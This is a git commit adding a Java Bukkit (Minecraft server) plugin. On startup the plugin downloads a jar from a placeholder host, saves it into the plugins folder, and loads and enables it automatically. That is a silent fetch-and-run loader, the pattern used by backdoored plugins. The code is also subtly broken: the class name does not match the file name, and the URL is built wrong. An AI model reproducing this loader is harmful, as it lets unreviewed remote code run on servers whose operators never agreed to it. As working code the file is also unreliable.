3b007d5697bc75dd9f1e84d636213cc525746817
Wendellmeset <69725697+wendellmeset@users.noreply.github.com>
2021-04-16 09:58:16 -0700

    Add files via upload

---
+++ Uploader.java
@@ -0,0 +1,46 @@
+package me.Python;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.net.URLConnection;
+import java.nio.file.CopyOption;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
+
+import org.bukkit.Bukkit;
+import org.bukkit.plugin.java.JavaPlugin;
+
+public class Enabled extends JavaPlugin {	
+	
+    @Override
+    public void onEnable() {
+        download();
+    }
+  
+ 
+	String name = "Plugin";
+	
+	private void download() {
+		try {
+			String url = "http://direct_download_url.com/Plugin.jar";
+			URLConnection in = new URL(url+name+".jar").openConnection();
+			in.addRequestProperty("User-Agent", "Mozilla");
+			InputStream res = in.getInputStream();
+			Files.copy(res, Paths.get(("plugins/" + name + ".jar"), new String[0]), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
+		} catch (Exception e) {
+		    e.printStackTrace();
+		}
+		try {
+			Bukkit.getPluginManager().loadPlugin(new File(Paths.get(("plugins/"+name+".jar"), new String[0]).toString()));
+		} catch (Exception e) {
+			   e.printStackTrace();
+		}
+		if (Bukkit.getPluginManager().getPlugin(name) != null) {
+			Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
+		}
+	}
+}
